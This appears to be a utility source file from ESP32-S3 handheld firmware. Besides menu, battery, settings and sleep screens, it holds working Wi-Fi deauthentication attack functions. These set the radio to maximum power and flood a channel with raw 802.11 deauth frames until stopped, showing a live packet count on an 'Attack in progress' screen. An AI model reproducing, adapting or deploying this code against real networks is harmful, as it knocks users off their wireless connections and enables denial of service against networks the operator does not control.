#include "utils.h"
#include "display.h"
#include "attacks.h"  // Inclure ce fichier pour accéder à deauthFrame

void waitForButtonPress(int pin) {
  while (digitalRead(pin) == HIGH) {
    delay(50);
  }
  delay(200);
}

bool isButtonPressed(int pin, bool &buttonState) {
  if (digitalRead(pin) == LOW && !buttonState) {
    buttonState = true;
    delay(200);
    return true;
  }
  if (digitalRead(pin) == HIGH && buttonState)
    buttonState = false;
  return false;
}

void sendDeauthFrameToAll(int channel) {
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Error setting WiFi channel");
    return;
  }
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

void continuousDeauthAttackToAll(int channel) {
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Error setting WiFi channel");
    return;
  }

  esp_wifi_set_max_tx_power(78);

  displayAttackScreen();

  uint32_t packetCount = 0;
  uint32_t lastUpdate = millis();
  char buf[20];

  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    packetCount++;

    if (millis() - lastUpdate >= 100) {
      updatePacketCountDisplay(packetCount);
      lastUpdate = millis();
    }
  }
  Serial.println("Attack stopped");
  delay(500);
}

void displayAttackScreen() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Attack in progress", tft.width()/2, 20);
  tft.setTextSize(1);
  tft.drawString("A: Stop", tft.width()/2, tft.height()-20);
}

void updatePacketCountDisplay(uint32_t packetCount) {
  tft.fillRect(0, 40, tft.width(), 20, COLOR_BLACK);
  char buf[20];
  sprintf(buf, "Packets: %lu", packetCount);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextDatum(TC_DATUM);
  tft.drawString(buf, tft.width()/2, 50);
}

void displayInfo() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Information", tft.width()/2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  const char* infos[] = {
    "Chip: ESP32-S3",
    "Screen: 170x320",
    "Flash: 16MB",
    "PSRAM: 8MB",
    "Battery: N/A"
  };
  for (int i = 0; i < 5; i++) {
    tft.drawString(infos[i], 10, 50 + i * 20);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

void displayBatteryInfo() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Battery Info", tft.width()/2, 20);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  if (voltage > 4300)
    tft.drawString("No battery connected!", 10, 50);
  else
    tft.drawString("Voltage: " + String(voltage) + " mV", 10, 50);

  waitForButtonPress(BUTTON_A);
  displayMenu();
}

void displaySettings() {
  const char* colors[] = {"Red", "White", "Orange", "Violet", "Blue"};
  uint16_t color_values[] = {COLOR_RED, COLOR_WHITE, COLOR_ORANGE, COLOR_VIOLET, COLOR_BLUE};
  int color_index = 0;
  while (true) {
    displaySettingsScreen(colors, color_index);

    if (digitalRead(BUTTON_A) == LOW) {
      brightness += 20;
      if (brightness > 255) brightness = 20;
      ledcWrite(LEDC_CHANNEL, brightness);
      delay(200);
    }
    if (digitalRead(BUTTON_B) == LOW) {
      unsigned long press_time = millis();
      while (digitalRead(BUTTON_B) == LOW) {
        if (millis() - press_time > 1000) {
          displayMenu();
          return;
        }
      }
      color_index = (color_index + 1) % 5;
      main_color = color_values[color_index];
      delay(200);
    }
    delay(100);
  }
}

void displaySettingsScreen(const char* colors[], int color_index) {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Settings", tft.width()/2, 20);

  tft.setTextSize(2);
  tft.drawString("Main color:", tft.width()/2, tft.height()/2 - 30);
  tft.setTextSize(3);
  tft.drawString(colors[color_index], tft.width()/2, tft.height()/2);

  tft.setTextSize(2);
  tft.drawString("Brightness: " + String(brightness), tft.width()/2, tft.height()/2 + 50);
}

void turnOffDisplay() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Turning Off...", tft.width()/2, tft.height()/2);
  delay(1000);

  digitalWrite(PIN_POWER_ON, LOW);
  digitalWrite(PIN_LCD_BL, LOW);
  tft.writecommand(0x10);
  esp_sleep_enable_ext0_wakeup((gpio_num_t)PIN_BUTTON_2, 0);
  esp_deep_sleep_start();
}
